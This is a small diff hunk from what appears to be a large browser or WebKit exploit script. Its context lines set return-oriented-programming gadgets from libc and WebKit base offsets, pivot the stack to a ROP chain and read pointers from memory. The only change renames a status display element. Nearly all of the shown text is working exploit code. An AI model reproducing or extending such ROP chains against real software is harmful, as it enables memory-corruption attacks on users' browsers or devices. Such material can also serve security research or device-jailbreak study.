@@ -26300,7 +26300,7 @@ db([128,0]);
 set_gadgets([libc_base+201260,libc_base+384176,libc_base+764760,ropchain+633472,webkit_base+660161,libc_base+782311]);
 db([0,0]);
 db([2,0,0,0,0,0]);
-msgs.innerHTML=LoadedMSG;
+progress.innerHTML=LoadedMSG;
 pivot(ropchain);
 var main_ret = read_ptr_at(main_ret);
 var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
